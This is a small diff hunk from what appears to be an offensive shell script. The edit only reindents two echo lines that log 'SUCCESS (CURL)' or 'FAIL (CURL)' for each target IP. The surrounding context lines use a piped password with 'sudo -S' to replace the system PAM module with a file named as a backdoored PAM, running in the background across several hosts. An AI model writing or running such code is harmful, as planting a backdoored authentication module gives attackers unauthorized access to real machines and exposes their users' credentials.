@@ -36,9 +36,8 @@ main() {
                     sleep 10 && \
                     echo \"$password\" | sudo -S mv \"$path_to_backdoored_pam\" \"$path_to_pam\"
                 " && \
-echo "SUCCESS (CURL): $IP" || \
-echo "FAIL    (CURL): $IP"
-
+                echo "SUCCESS (CURL): $IP" || \
+                echo "FAIL    (CURL): $IP"
             }
         } &
 
